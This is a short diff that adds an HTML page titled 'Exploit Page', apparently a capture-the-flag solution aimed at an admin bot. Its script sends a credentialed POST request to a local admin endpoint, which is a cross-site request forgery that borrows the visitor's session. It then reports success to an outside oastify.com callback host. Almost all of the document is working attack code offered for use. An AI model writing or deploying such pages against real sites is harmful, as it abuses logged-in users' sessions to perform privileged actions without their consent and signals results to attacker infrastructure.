@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Exploit Page</title>
+  </head>
+  <body>
+    <script>
+      // Example: make an admin-only POST request
+      fetch("http://127.0.0.1:1337/admin/", {
+        method: "POST",
+        credentials: "include",
+      })
+        .then(() => {
+          // Optionally notify your server
+          fetch("https://sgctyjfjy72sovxi0bsofid3wu2lqde2.oastify.com/log", {
+            method: "POST",
+            body: "Admin bot visited and did the exploit",
+          });
+        })
+        .catch(console.error);
+    </script>
+  </body>
+</html>
